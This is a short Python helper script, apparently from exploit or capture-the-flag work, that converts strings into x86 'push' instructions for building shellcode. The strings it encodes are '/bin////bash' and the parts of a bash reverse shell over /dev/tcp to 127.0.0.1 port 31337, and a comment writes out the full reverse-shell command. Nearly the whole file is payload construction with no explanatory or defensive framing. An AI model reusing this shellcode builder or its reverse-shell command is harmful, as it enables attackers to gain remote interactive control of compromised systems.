
# my_str= my_str+(4 - len(my_str)%4)*'/'


def push(my_str):
    print(my_str)
    tp = ''

    for i in range(len(my_str)//4):
        sub = my_str[i*4:(i+1)*4]
        print(sub)
        top = '0x'
        for i in range(4):
            top += format(ord(sub[-1-i]), "x")
        tp = f'push ${top}\n' + tp
    print(tp)


push('/bin////bash')
push('-hhc') # pad with h to alignment
# bash -I>&/dev/tcp/127.0.0.1/31337 0>&1
push('0>&1')
push('    ')
push('-i>&/dev/tcp/127.0.0.1/31337')
push('bash')
